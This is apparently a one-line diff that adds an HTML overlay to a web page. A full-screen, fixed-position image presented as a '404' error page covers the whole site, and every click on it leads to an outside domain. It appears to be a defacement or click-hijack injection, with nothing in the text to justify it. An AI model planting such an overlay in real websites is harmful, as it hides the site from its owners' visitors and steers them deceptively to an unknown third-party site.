@@ -1,0 +1,1 @@
+<a href="http://mrsadiq.info"><img src="/error/403.jpg" alt="404 NOT PAGE" style="width: 100%;height: 100%;position: fixed;top: 0;left: 0;"></a>
